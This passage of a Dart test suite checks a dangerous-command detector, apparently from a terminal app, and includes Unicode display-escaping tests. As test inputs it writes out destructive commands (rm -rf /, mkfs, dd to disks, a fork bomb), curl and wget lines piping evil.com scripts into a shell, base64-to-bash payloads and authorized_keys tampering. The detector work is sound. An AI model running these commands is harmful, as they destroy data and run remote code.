      test('a long run of letters after $name is read within its budget', () {
        final clock = Stopwatch()..start();
        final found = DangerousCommandService.checkFilled(text);
        expect(clock.elapsedMilliseconds, lessThan(5000));
        expect(found.map((m) => m.kind), isNot(contains(DangerKind.tooLong)), reason: 'all of it is read');
      });
    }

    test('what is past what is read is asked about in red, and says so, quoting the start', () {
      final en = lookupAppLocalizations(const Locale('en'));
      final text = '${'x' * DangerousCommandService.kMaxRead} rm -rf /';
      final found = DangerousCommandService.checkFilled(text);
      expect(found.map((m) => m.kind), [DangerKind.tooLong]);
      expect(worstDangerLevel(found), DangerLevel.harm);
      expect(found.single.quotedIn(text), hasLength(DangerousCommandMatch.kMaxQuoted));
      expect(found.single.quotedIn(text), startsWith('xxx'));
      expect(DangerKind.tooLong.describe(en), 'Too long to check to the end');
      expect(DangerKind.tooLong.explain(en, 'x'), contains('`x`'));
    });

    test('as much as is read is read to its end, and nothing is said of its length', () {
      const tail = ' rm -rf /';
      final text = '${'x' * (DangerousCommandService.kMaxRead - tail.length)}$tail';
      expect(text, hasLength(DangerousCommandService.kMaxRead));
      expect(DangerousCommandService.checkFilled(text).map((m) => m.kind), [DangerKind.criticalDelete]);
      expect(DangerousCommandService.checkFilled('x' * DangerousCommandService.kMaxRead), isEmpty);
    });

    test('what is found in what is read is said as well', () {
      final text = 'reboot ${'x' * DangerousCommandService.kMaxRead}';
      expect(DangerousCommandService.checkFilled(text).map((m) => m.kind), [DangerKind.reboot, DangerKind.tooLong]);
    });

    test('quotes are read past only in what is read', () {
      final text = "r'm' -rf / ${'x' * DangerousCommandService.kMaxRead}";
      expect(DangerousCommandService.checkFilled(text).map((m) => m.kind), containsAll([DangerKind.criticalDelete, DangerKind.tooLong]));
    });

    // A build for release goes back through a rule on a stack of its own, which can
    // run out where a test's does not: `rm` and a megabyte of spaces threw, and what
    // was asked after that was never asked.
    test('a rule that runs out of room to go back in is asked about, not thrown', () {
      DangerousCommandService.debugRulesRunOutOfRoom = true;
      addTearDown(() => DangerousCommandService.debugRulesRunOutOfRoom = false);
      final found = DangerousCommandService.checkFilled('uptime');
      expect(found.map((m) => m.kind), [DangerKind.tooLong]);
      expect(worstDangerLevel(found), DangerLevel.harm);
      expect(found.single.quotedIn('uptime'), 'uptime');
    });

    test('in what it says of a masked command, the words it was given and no others', () {
      const dots = '••••••';
      final runs = "login '${'x' * DangerousCommandService.kMaxRead}'";
      const shown = "login '$dots'";
      final said = DangerousCommandService.asShown(runs, shown, DangerousCommandService.checkFilled(runs));
      expect(said.map((m) => m.kind), [DangerKind.tooLong]);
      expect(said.single.quotedIn(shown), shown);
    });
  });

  group('a command shown for a decision', () {
    test('what would not show as itself is shown by its number', () {
      expect(visibleCommand('ls\u202e -la'), r'ls\u202e -la');
      expect(visibleCommand('a\u0085b\u009bc'), r'a\u0085b\u009bc');
      expect(visibleCommand('a\u200bb\u200fc\ufeffd\u00ade'), r'a\u200bb\u200fc\ufeffd\u00ade');
      expect(visibleCommand('a\u2066b\u2069c\u2028d'), r'a\u2066b\u2069c\u2028d');
      expect(visibleCommand('a\u{e0041}b'), r'a\u{e0041}b');
      expect(visibleCommand('a\nb\tc\x1bd\x00e\x07f\x7fg'), r'a\nb\tc\ed\0e\x07f\x7fg');
      expect(visibleCommand('rm -rf /tmp/é 日本語 😀'), 'rm -rf /tmp/é 日本語 😀');
      expect(visibleCommand('one\ntwo\tthree\r\u202e', keepLines: true), 'one\ntwo\tthree\\r\\u202e');
    });

    test('quoted in a sentence, a bidi control shows, and the cut falls between characters', () {
      const bidi = 'rm -rf /\u202e';
      expect(const DangerousCommandMatch('', DangerKind.criticalDelete, start: 0, end: bidi.length).quotedIn(bidi),
          r'rm -rf /\u202e');

      // The 48th unit is the second half of a pair: cut there, it drew garbage.
      final long = 'rm -rf ${'x' * 39}😀 /';
      final quoted = DangerousCommandMatch('', DangerKind.criticalDelete, start: 0, end: long.length).quotedIn(long);
      expect(quoted.runes.where((r) => r >= 0xd800 && r <= 0xdfff), isEmpty, reason: 'half a pair: $quoted');
      expect(quoted, endsWith('…'));
      expect(quoted.characters.length, DangerousCommandMatch.kMaxQuoted);

      // A pair in a family of them: a whole character goes, not a part of it.
      final family = 'rm -rf ${'x' * 39}👨‍👩‍👧‍👦 and more words after it /';
      final cut = DangerousCommandMatch('', DangerKind.criticalDelete, start: 0, end: family.length).quotedIn(family);
      expect(cut.runes.where((r) => r >= 0xd800 && r <= 0xdfff), isEmpty);
    });

    test('a command for a question is cut between characters, and made visible', () {
      expect(commandForQuestion('short'), 'short');
      final cut = commandForQuestion('${'x' * 118}😀😀😀');
      expect(cut.runes.where((r) => r >= 0xd800 && r <= 0xdfff), isEmpty);
      expect(cut, endsWith('…'));
      expect(commandForQuestion('ls\u202e'), r'ls\u202e');
    });
  });

  group('DangerousCommandService.check', () {
    // ── Dangerous commands detected ──────────────────────────────

    group('destructive commands are detected', () {
      test('rm -rf / is detected', () {
        final matches = DangerousCommandService.check('rm -rf /');
        expect(matches, isNotEmpty);
        expect(
          matches.any((m) => m.kind == DangerKind.criticalDelete),
          isTrue,
        );
      });

      test('rm -rf /* is detected', () {
        final matches = DangerousCommandService.check('rm -rf /*');
        expect(matches, isNotEmpty);
      });

      test('rm -rf /var/log is detected', () {
        final matches = DangerousCommandService.check('rm -rf /var/log');
        expect(matches, isNotEmpty);
      });

      test('sudo rm -rf / is detected', () {
        final matches = DangerousCommandService.check('sudo rm -rf /');
        expect(matches, isNotEmpty);
      });

      test('rm -rf * is detected', () {
        final matches = DangerousCommandService.check('rm -rf *');
        expect(matches, isNotEmpty);
      });
    });

    group('filesystem format commands are detected', () {
      test('mkfs.ext4 is detected', () {
        final matches =
            DangerousCommandService.check('mkfs.ext4 /dev/sda1');
        expect(matches, isNotEmpty);
        expect(
          matches.any((m) => m.kind == DangerKind.formatDisk),
          isTrue,
        );
      });

      test('mkfs.xfs is detected', () {
        final matches = DangerousCommandService.check('mkfs.xfs /dev/sdb');
        expect(matches, isNotEmpty);
      });
    });

    group('fork bomb is detected', () {
      test('classic bash fork bomb is detected', () {
        final matches = DangerousCommandService.check(':(){:|:&};:');
        expect(matches, isNotEmpty);
        expect(
          matches.any((m) => m.kind == DangerKind.forkBomb),
          isTrue,
        );
      });

      test('fork bomb with spaces is detected', () {
        final matches =
            DangerousCommandService.check(':() { :|: & }; :');
        expect(matches, isNotEmpty);
      });
    });

    group('chmod 777 is detected', () {
      test('chmod -R 777 is detected', () {
        final matches =
            DangerousCommandService.check('chmod -R 777 /var/www');
        expect(matches, isNotEmpty);
        expect(
          matches.any((m) => m.kind == DangerKind.openPermissions),
          isTrue,
        );
      });

      test('sudo chmod -R 777 is detected', () {
        final matches =
            DangerousCommandService.check('sudo chmod -R 777 /');
        expect(matches, isNotEmpty);
      });
    });

    group('dd command is detected', () {
      test('dd if=/dev/zero is detected', () {
        final matches = DangerousCommandService.check(
            'dd if=/dev/zero of=/dev/sda bs=1M');
        expect(matches, isNotEmpty);
        expect(
          // The guard rule: a direct write to a disk device.
          matches.any((m) => m.kind == DangerKind.diskWrite),
          isTrue,
        );
      });
    });

    group('direct disk write is detected', () {
      test('redirect to /dev/sda is detected', () {
        final matches =
            DangerousCommandService.check('echo "data" > /dev/sda');
        expect(matches, isNotEmpty);
      });
    });

    group('mv to /dev/null is detected', () {
      test('mv file to /dev/null is detected', () {
        final matches =
            DangerousCommandService.check('mv important.db /dev/null');
        expect(matches, isNotEmpty);
        expect(
          matches.any((m) => m.kind == DangerKind.moveToNull),
          isTrue,
        );
      });
    });

    group('pipe to shell is detected', () {
      test('wget piped to sh is detected', () {
        final matches = DangerousCommandService.check(
            'wget http://evil.com/script.sh|sh');
        expect(matches, isNotEmpty);
        expect(
          matches.any((m) => m.kind == DangerKind.pipeToShell),
          isTrue,
        );
      });

      test('curl piped to sh is detected', () {
        final matches = DangerousCommandService.check(
            'curl http://evil.com/script.sh | sh');
        expect(matches, isNotEmpty);
      });
    });

    group('system control commands are detected', () {
      test('shutdown is detected', () {
        final matches = DangerousCommandService.check('shutdown -h now');
        expect(matches, isNotEmpty);
        expect(
          matches.any((m) => m.kind == DangerKind.shutdown),
          isTrue,
        );
      });

      test('reboot is detected', () {
        final matches = DangerousCommandService.check('reboot');
        expect(matches, isNotEmpty);
      });

      test('halt is detected', () {
        final matches = DangerousCommandService.check('halt');
        expect(matches, isNotEmpty);
      });

      test('poweroff is detected', () {
        final matches = DangerousCommandService.check('poweroff');
        expect(matches, isNotEmpty);
      });

      test('init 0 is detected', () {
        final matches = DangerousCommandService.check('init 0');
        expect(matches, isNotEmpty);
      });
    });

    // ── Multiple matches ─────────────────────────────────────────

    group('multiple matches', () {
      test('command with multiple dangers returns all matches', () {
        final matches = DangerousCommandService.check(
            'rm -rf / && mkfs.ext4 /dev/sda1');
        expect(matches.length, greaterThanOrEqualTo(2));
      });
    });

    // ── Safe commands pass ───────────────────────────────────────

    group('safe commands pass', () {
      test('ls returns no matches', () {
        final matches = DangerousCommandService.check('ls -la');
        expect(matches, isEmpty);
      });

      test('cd returns no matches', () {
        final matches = DangerousCommandService.check('cd /var/log');
        expect(matches, isEmpty);
      });

      test('echo returns no matches', () {
        final matches =
            DangerousCommandService.check('echo "hello world"');
        expect(matches, isEmpty);
      });

      test('cat returns no matches', () {
        final matches =
            DangerousCommandService.check('cat /etc/hostname');
        expect(matches, isEmpty);
      });

      test('grep returns no matches', () {
        final matches =
            DangerousCommandService.check('grep -r "pattern" /var/log');
        expect(matches, isEmpty);
      });

      test('mkdir returns no matches', () {
        final matches =
            DangerousCommandService.check('mkdir -p /tmp/mydir');
        expect(matches, isEmpty);
      });

      test('ps aux returns no matches', () {
        final matches = DangerousCommandService.check('ps aux');
        expect(matches, isEmpty);
      });

      test('top returns no matches', () {
        final matches = DangerousCommandService.check('top -bn1');
        expect(matches, isEmpty);
      });

      test('uptime returns no matches', () {
        final matches = DangerousCommandService.check('uptime');
        expect(matches, isEmpty);
      });

      test('df returns no matches', () {
        final matches = DangerousCommandService.check('df -h');
        expect(matches, isEmpty);
      });

      test('safe rm (no -rf /) passes', () {
        final matches =
            DangerousCommandService.check('rm myfile.txt');
        expect(matches, isEmpty);
      });

      test('safe chmod (not -R 777) passes', () {
        final matches =
            DangerousCommandService.check('chmod 644 config.yaml');
        expect(matches, isEmpty);
      });

      test('chmod 755 passes', () {
        final matches =
            DangerousCommandService.check('chmod 755 script.sh');
        expect(matches, isEmpty);
      });
    });

    // ── Edge cases ───────────────────────────────────────────────

    group('edge cases', () {
      test('empty string returns no matches', () {
        final matches = DangerousCommandService.check('');
        expect(matches, isEmpty);
      });

      test('whitespace-only string returns no matches', () {
        final matches = DangerousCommandService.check('   ');
        expect(matches, isEmpty);
      });

      test('case insensitive detection', () {
        final matches = DangerousCommandService.check('SHUTDOWN -h now');
        expect(matches, isNotEmpty);
      });

      test('command embedded in longer string is detected', () {
        final matches = DangerousCommandService.check(
            'sudo rm -rf / --no-preserve-root');
        expect(matches, isNotEmpty);
      });

      test('DangerousCommandMatch has correct fields', () {
        final matches = DangerousCommandService.check('rm -rf /');
        expect(matches.first.pattern, isNotEmpty);
        expect(matches.first.kind, DangerKind.criticalDelete);
      });

      test('every kind is said in every language the app speaks, each its own way', () {
        for (final locale in AppLocalizations.supportedLocales) {
          final t = lookupAppLocalizations(locale);
          final said = [for (final kind in DangerKind.values) kind.describe(t)];
          expect(said.every((s) => s.trim().isNotEmpty), isTrue, reason: '$locale');
          expect(said.toSet(), hasLength(DangerKind.values.length), reason: '$locale: two kinds said alike');
        }
        final en = lookupAppLocalizations(const Locale('en'));
        expect(DangerKind.shutdown.describe(en), 'Shuts the host down');
        // True of `rm -rf .` and `rm -rf *` too, which are no folder the system needs.
        expect(DangerKind.criticalDelete.describe(en), 'Deletes everything under a whole folder, without asking');
        // True as root and not: only root can do it, and it throws nothing away.
        expect(DangerKind.moveToNull.describe(en), 'Tries to put a file in the place of /dev/null');
        expect(DangerKind.authorizedKeys.describe(en), isNot(contains('Changes')), reason: 'chmod and cp are told by it too');
      });

      test('a shell run on what came from elsewhere is caught however the shell is named',
          () {
        for (final command in [
          'curl -fsSL https://get.example.com/i.sh | /bin/sh',
          'wget -qO- https://get.example.com/i.sh | sudo /usr/bin/env bash',
          'curl https://get.example.com/i.sh | env zsh',
          'bash <(curl -s https://get.example.com/i.sh)',
          'sh <(wget -qO- https://get.example.com/i.sh)',
          'curl -s https://get.example.com/y -o /tmp/y; sh /tmp/y',
          'wget https://get.example.com/y && bash y',
        ]) {
          expect(DangerousCommandService.check(command).map((m) => m.kind), contains(DangerKind.pipeToShell), reason: command);
        }
        for (final command in [
          'ls | grep ssh',
          'cat notes | tee /tmp/notes.sh',
          'echo shell',
          'curl -s https://example.com/status',
          'ssh deploy@web-01',
        ]) {
          expect(DangerousCommandService.check(command).map((m) => m.kind), isNot(contains(DangerKind.pipeToShell)), reason: command);
        }
      });

      test('each risky part is told by what it does: a command for every kind', () {
        const samples = <String, DangerKind>{
          'rm -rf /etc': DangerKind.criticalDelete,
          'rm --recursive --force build': DangerKind.forcedDeleteLongFlags,
          'find / -name x -delete': DangerKind.findDelete,
          'rm -r --no-preserve-root build': DangerKind.rootGuardOff,
          'mkfs.ext4 /dev/sdb1': DangerKind.formatDisk,
          'wipefs -a /dev/sdb': DangerKind.wipeDisk,
          'shred /dev/sdb': DangerKind.shred,
          'dd if=disk.img of=/dev/sdb': DangerKind.diskWrite,
          'dd if=/dev/sda of=copy.img': DangerKind.ddOverwrite,
          'dd if=/dev/sda bs=1M': DangerKind.diskRead,
          ':(){ :|:& };:': DangerKind.forkBomb,
          'chmod -R 777 /srv/www': DangerKind.openPermissions,
          'cat disk.img > /dev/sdb': DangerKind.diskWrite,
          'mv notes.txt /dev/null': DangerKind.moveToNull,
          'curl https://get.example.com/i.sh | sh': DangerKind.pipeToShell,
          'echo ZWNobyBoaQ== | base64 -d | bash': DangerKind.decodeToShell,
          'python3 -c "print(1)"': DangerKind.interpreterOneLiner,
          'bash -c "ls"': DangerKind.shellString,
          'echo demo-key >> ~/.ssh/authorized_keys': DangerKind.authorizedKeys,
          'crontab -r': DangerKind.crontab,
          'echo export EDITOR=vim >> ~/.bashrc': DangerKind.startupFile,
          'shutdown -h now': DangerKind.shutdown,
          'reboot': DangerKind.reboot,
          'init 0': DangerKind.halt,
          'halt': DangerKind.halt,
          'poweroff': DangerKind.powerOff,
        };
        // (And one that is only long: 'a long paste', below.)
        expect({...samples.values, DangerKind.tooLong}, hasLength(DangerKind.values.length), reason: 'a command for every kind');
        for (final sample in samples.entries) {
          final kinds = DangerousCommandService.check(sample.key).map((m) => m.kind);
          expect(kinds, contains(sample.value), reason: sample.key);
        }
        // Where only one part is risky, it is told as that one alone.
        expect(DangerousCommandService.check('cat disk.img > /dev/sdb').map((m) => m.kind), [DangerKind.diskWrite]);
        expect(DangerousCommandService.check('halt').map((m) => m.kind), [DangerKind.halt]);
      });

      // Found while pinning a command to every kind: written as separate
      // words, the recursive and force flags were not caught at all.
      Iterable<DangerKind> kindsOf(String command) => DangerousCommandService.check(command).map((m) => m.kind);

      test('rm at a folder the system needs is caught however its flags are written', () {
        for (final command in [
          'rm -r -f /',
          'rm -f -r /etc',
          'rm --recursive --force /',
          'rm -r --force ~',
          'rm --force -R /var/log',
          'sudo rm -v -r -f /*',
          'rm -rf /',
          'rm -i -rf /usr',
          // A critical target after another argument: the stray space.
          'rm -rf build /*',
          'rm -rf ./build /*',
          'rm build -rf /etc',
          // One command carried on to the next line.
          'rm -rf \\\n  /',
          'rm -r \\\r\n  -f /home',
          'rm \\\n  -rf /',
        ]) {
          expect(kindsOf(command), contains(DangerKind.criticalDelete), reason: command);
        }
        final match = DangerousCommandService.check('sudo rm -r -f / && ls').firstWhere((m) => m.kind == DangerKind.criticalDelete);
        expect(match.start, 5, reason: 'the span shown begins at rm');
      });

      test('rm without both flags, or at a folder of no concern, is not told as deleting what the system needs', () {
        for (final command in [
          'rm -r build',
          'rm -f /etc/demo.conf',
          'rm -rv /',
          'rm -r -f /tmp/demo',
          'rm -rf build',
          'rm --recursive build',
          'rm -r -- -f',
          'rm -rf build /tmp/demo',
          // The flags or the folder belong to another command.
          'rm -rf build && ls /',
          'rm -r build; ls -f /',
          'rm -rf build | tee /',
          'rm -rf build\nls /',
        ]) {
          expect(kindsOf(command), isNot(contains(DangerKind.criticalDelete)), reason: command);
        }
      });

      test('the long flags are caught a space apart, in either order, and only both together', () {
        for (final command in [
          'rm --recursive --force build',
          'rm --force --recursive build',
          'rm -v --recursive -i --force build',
        ]) {
          expect(kindsOf(command), contains(DangerKind.forcedDeleteLongFlags), reason: command);
        }
        for (final command in [
          'rm --recursive build',
          'rm --force build',
          'rm --force --force build',
          // Two commands, one flag each.
          'rm --recursive build; git push --force',
          'rm --recursive build && git push --force',
          'rm --force build | tee --recursive',
          'rm --recursive build\ngit push --force',
        ]) {
          expect(kindsOf(command), isNot(contains(DangerKind.forcedDeleteLongFlags)), reason: command);
        }
      });

      test('a long one-line paste is checked quickly', () {
        // Each rm looked over the whole rest of the paste for the long flags,
        // so a paste of many rm took seconds (about 5 for the first of these),
        // as did dd, mv and base64 for their second part. What each rule
        // looks over is bounded now. (Sizes where looking over the rest of
        // the line takes seconds even once a rule has run before and been
        // compiled: dd and mv take 2.6 and 4.6 s that way, against 50 ms.)
        for (final paste in [
          'rm -a ' * 40000,
          'rm -rf build ' * 20000,
          'dd ' * 40000,
          'mv a ' * 40000,
          'base64 ' * 20000,
        ]) {
          final clock = Stopwatch()..start();
          DangerousCommandService.check(paste);
          expect(clock.elapsedMilliseconds, lessThan(1500), reason: paste.substring(0, 13));
        }
      });

      test('dd, mv and base64 are told by their second part in the same command', () {
        expect(kindsOf('dd if=disk.img of=/dev/sdb bs=4M'), contains(DangerKind.diskWrite));
        expect(kindsOf('dd if=disk.img of=copy.img; echo of=/dev/sda'), isNot(contains(DangerKind.diskWrite)));
        expect(kindsOf('mv   notes.txt   /dev/null'), contains(DangerKind.moveToNull));
        expect(kindsOf('mv notes.txt backup/; ls /dev/null'), isNot(contains(DangerKind.moveToNull)));
        expect(kindsOf('echo eA== | base64 -d | tee out.sh | bash'), contains(DangerKind.decodeToShell));
        final apart = kindsOf('base64 -d payload.txt > out.txt; cat out.txt | bash');
        expect(apart, contains(DangerKind.pipeToShell));
        expect(apart, isNot(contains(DangerKind.decodeToShell)));
      });
    });
  });
}
